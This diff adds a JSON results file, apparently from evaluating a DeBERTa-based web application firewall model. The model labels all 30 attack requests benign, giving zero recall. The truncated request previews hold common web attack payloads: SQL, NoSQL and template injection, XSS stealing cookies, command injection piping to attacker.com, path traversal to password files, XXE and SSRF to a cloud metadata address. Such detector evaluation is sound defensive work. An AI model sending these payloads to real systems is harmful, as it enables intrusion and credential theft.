@@ -1,0 +1,319 @@
+{
+  "summary": {
+    "total_requests": 30,
+    "malicious_detected": 0,
+    "benign_detected": 30,
+    "detection_rate": 0.0,
+    "avg_reconstruction_loss": 6.2475309113661455,
+    "avg_confidence": 28.546797287432543,
+    "avg_anomaly_score": 1.3324667303423994
+  },
+  "risk_distribution": {
+    "LOW": 30,
+    "MEDIUM": 0,
+    "HIGH": 0,
+    "CRITICAL": 0
+  },
+  "threshold": 8.743528175354001,
+  "baseline_stats": {
+    "mean": 2.2028492202726193,
+    "std": 3.035484188077385,
+    "median": 0.9467264711856842,
+    "percentile_95": 8.743528175354001,
+    "percentile_99": 12.719206466674805,
+    "min": 0.0,
+    "max": 12.753633499145508
+  },
+  "malicious_indices": [],
+  "detailed_results": [
+    {
+      "index": 0,
+      "is_malicious": false,
+      "confidence": 29.745291300727274,
+      "reconstruction_loss": 6.142740249633789,
+      "anomaly_score": 1.2979448368850235,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/products QUERY:id=1' UNION SELECT username, password FROM users-- HEADER:user-agent..."
+    },
+    {
+      "index": 1,
+      "is_malicious": false,
+      "confidence": 32.267315723742264,
+      "reconstruction_loss": 5.922226333618164,
+      "anomaly_score": 1.225299452375446,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/login QUERY:username=admin' AND '1'='1&password=anything HEADER:user-agent:Mozilla/..."
+    },
+    {
+      "index": 2,
+      "is_malicious": false,
+      "confidence": 60.46226218126727,
+      "reconstruction_loss": 3.456993246078491,
+      "anomaly_score": 0.4131611130546595,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/search QUERY:q=test' AND SLEEP(5)-- HEADER:user-agent:Mozilla/5.0..."
+    },
+    {
+      "index": 3,
+      "is_malicious": false,
+      "confidence": 43.07178974473851,
+      "reconstruction_loss": 4.9775341033935545,
+      "anomaly_score": 0.9140831284904057,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/update HEADER:content-type:application/json BODY:{\"id\": \"1; DROP TABLE users--..."
+    },
+    {
+      "index": 4,
+      "is_malicious": false,
+      "confidence": 12.171828183901246,
+      "reconstruction_loss": 7.679280948638916,
+      "anomaly_score": 1.8041377879273222,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/items QUERY:id=1' UNION SELECT NULL, NULL, NULL-- HEADER:user-agent:Mozilla/5.0..."
+    },
+    {
+      "index": 5,
+      "is_malicious": false,
+      "confidence": 37.69260756066763,
+      "reconstruction_loss": 5.447864413261414,
+      "anomaly_score": 1.0690272101348424,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/search QUERY:q=<script>alert('XSS')</script> HEADER:user-agent:Mozilla/5.0..."
+    },
+    {
+      "index": 6,
+      "is_malicious": false,
+      "confidence": 25.86127033263409,
+      "reconstruction_loss": 6.482340717315674,
+      "anomaly_score": 1.4098217061554188,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/profile QUERY:name=<img src=x onerror=alert(document.cookie)> HEADER:user-agent:Moz..."
+    },
+    {
+      "index": 7,
+      "is_malicious": false,
+      "confidence": 39.25520855454501,
+      "reconstruction_loss": 5.311237955093384,
+      "anomaly_score": 1.0240174358442486,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/comment QUERY:text=<svg onload=alert('XSS')> HEADER:user-agent:Mozilla/5.0..."
+    },
+    {
+      "index": 8,
+      "is_malicious": false,
+      "confidence": 11.377254848682272,
+      "reconstruction_loss": 7.748754692077637,
+      "anomaly_score": 1.8270249911325294,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/redirect QUERY:url=javascript:alert('XSS') HEADER:user-agent:Mozilla/5.0..."
+    },
+    {
+      "index": 9,
+      "is_malicious": false,
+      "confidence": 31.17683980345306,
+      "reconstruction_loss": 6.017572402954102,
+      "anomaly_score": 1.2567099501505397,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/post HEADER:content-type:application/json BODY:{\"content\": \"<div onmouseover=a..."
+    },
+    {
+      "index": 10,
+      "is_malicious": false,
+      "confidence": 34.105550175759724,
+      "reconstruction_loss": 5.7614997863769535,
+      "anomaly_score": 1.1723502234278849,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/ping HEADER:content-type:application/json BODY:{\"host\": \"8.8.8.8; cat /etc/pas..."
+    },
+    {
+      "index": 11,
+      "is_malicious": false,
+      "confidence": 18.5963678274264,
+      "reconstruction_loss": 7.1175495147705075,
+      "anomaly_score": 1.6190828184187516,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/exec HEADER:content-type:application/json BODY:{\"cmd\": \"ls | nc attacker.com 4..."
+    },
+    {
+      "index": 12,
+      "is_malicious": false,
+      "confidence": 32.689583157045654,
+      "reconstruction_loss": 5.885305261611938,
+      "anomaly_score": 1.2131362949617974,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/api/system QUERY:cmd=`whoami` HEADER:user-agent:Mozilla/5.0..."
+    },
+    {
+      "index": 13,
+      "is_malicious": false,
+      "confidence": 16.145774127675196,
+      "reconstruction_loss": 7.331817865371704,
+      "anomaly_score": 1.6896706842501035,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/run HEADER:content-type:application/json BODY:{\"command\": \"echo test && cat /e..."
+    },
+    {
+      "index": 14,
+      "is_malicious": false,
+      "confidence": 38.15452949175554,
+      "reconstruction_loss": 5.407476139068604,
+      "anomaly_score": 1.0557218289533343,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/download QUERY:file=../../../../etc/passwd HEADER:user-agent:Mozilla/5.0..."
+    },
+    {
+      "index": 15,
+      "is_malicious": false,
+      "confidence": 24.94165464747494,
+      "reconstruction_loss": 6.562747573852539,
+      "anomaly_score": 1.4363106784428326,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/files QUERY:path=..%2F..%2F..%2Fetc%2Fpasswd HEADER:user-agent:Mozilla/5.0..."
+    },
+    {
+      "index": 16,
+      "is_malicious": false,
+      "confidence": 18.05861002669884,
+      "reconstruction_loss": 7.164568519592285,
+      "anomaly_score": 1.6345726058491905,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/download QUERY:file=..\\..\\..\\windows\\system32\\config\\sam HEADER:user-agent:Mozilla/..."
+    },
+    {
+      "index": 17,
+      "is_malicious": false,
+      "confidence": 8.241790819534224,
+      "reconstruction_loss": 8.022904872894287,
+      "anomaly_score": 1.9173401315946155,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/view QUERY:file=../../../etc/passwd%00.jpg HEADER:user-agent:Mozilla/5.0..."
+    },
+    {
+      "index": 18,
+      "is_malicious": false,
+      "confidence": 26.245070789816026,
+      "reconstruction_loss": 6.448783016204834,
+      "anomaly_score": 1.3987665666680689,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/upload HEADER:content-type:application/xml BODY:<?xml version=\"1.0\"?><!DOCTYPE..."
+    },
+    {
+      "index": 19,
+      "is_malicious": false,
+      "confidence": 21.82434238458797,
+      "reconstruction_loss": 6.835310649871826,
+      "anomaly_score": 1.526102968282406,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/parse HEADER:content-type:application/xml BODY:<?xml version=\"1.0\"?><!DOCTYPE ..."
+    },
+    {
+      "index": 20,
+      "is_malicious": false,
+      "confidence": 5.322391925930292,
+      "reconstruction_loss": 8.27816333770752,
+      "anomaly_score": 2.001431646818389,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/xml HEADER:content-type:application/xml BODY:<?xml version=\"1.0\"?><!DOCTYPE fo..."
+    },
+    {
+      "index": 21,
+      "is_malicious": false,
+      "confidence": 20.53401488514637,
+      "reconstruction_loss": 6.948130798339844,
+      "anomaly_score": 1.5632700696335338,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/login HEADER:content-type:application/json BODY:{\"username\": {\"$ne\": null}, \"p..."
+    },
+    {
+      "index": 22,
+      "is_malicious": false,
+      "confidence": 19.471850790168986,
+      "reconstruction_loss": 7.041001415252685,
+      "anomaly_score": 1.5938650624447674,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/users HEADER:content-type:application/json BODY:{\"age\": {\"$gt\": 0}}..."
+    },
+    {
+      "index": 23,
+      "is_malicious": false,
+      "confidence": 15.37282704804701,
+      "reconstruction_loss": 7.39940071105957,
+      "anomaly_score": 1.7119349562740904,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/search HEADER:content-type:application/json BODY:{\"$where\": \"this.password == ..."
+    },
+    {
+      "index": 24,
+      "is_malicious": false,
+      "confidence": 29.959787980563945,
+      "reconstruction_loss": 6.123985671997071,
+      "anomaly_score": 1.2917663900624765,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/fetch HEADER:content-type:application/json BODY:{\"url\": \"http://169.254.169.25..."
+    },
+    {
+      "index": 25,
+      "is_malicious": false,
+      "confidence": 38.03681405503846,
+      "reconstruction_loss": 5.4177686214447025,
+      "anomaly_score": 1.0591125507421433,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/api/proxy QUERY:url=http://192.168.1.1/admin HEADER:user-agent:Mozilla/5.0..."
+    },
+    {
+      "index": 26,
+      "is_malicious": false,
+      "confidence": 46.392478249238664,
+      "reconstruction_loss": 4.687188768386841,
+      "anomaly_score": 0.818432709309467,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/webhook HEADER:content-type:application/json BODY:{\"callback\": \"http://localho..."
+    },
+    {
+      "index": 27,
+      "is_malicious": false,
+      "confidence": 32.47704377468257,
+      "reconstruction_loss": 5.903888702392578,
+      "anomaly_score": 1.2192583630172433,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/greet QUERY:name={{7*7}} HEADER:user-agent:Mozilla/5.0..."
+    },
+    {
+      "index": 28,
+      "is_malicious": false,
+      "confidence": 60.16579501213195,
+      "reconstruction_loss": 3.482914936542511,
+      "anomaly_score": 0.42170067012625745,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:GET PATH:/template QUERY:data=<%= 7*7 %> HEADER:user-agent:Mozilla/5.0..."
+    },
+    {
+      "index": 29,
+      "is_malicious": false,
+      "confidence": 26.58597321989492,
+      "reconstruction_loss": 6.41897611618042,
+      "anomaly_score": 1.3889470788441862,
+      "risk_level": "LOW",
+      "request_preview": "METHOD:POST PATH:/api/render HEADER:content-type:application/json BODY:{\"template\": \"{{7*7}}\"}..."
+    }
+  ],
+  "evaluation": {
+    "accuracy": 0.0,
+    "precision": 0.0,
+    "recall": 0.0,
+    "f1_score": 0.0,
+    "true_positives": 0,
+    "true_negatives": 0,
+    "false_positives": 0,
+    "false_negatives": 30,
+    "total_samples": 30,
+    "confusion_matrix": {
+      "TP": 0,
+      "TN": 0,
+      "FP": 0,
+      "FN": 30
+    }
+  },
+  "timestamp": "2025-11-23T12:31:41.317037",
+  "model_path": "models/deberta-waf/best_model"
+}
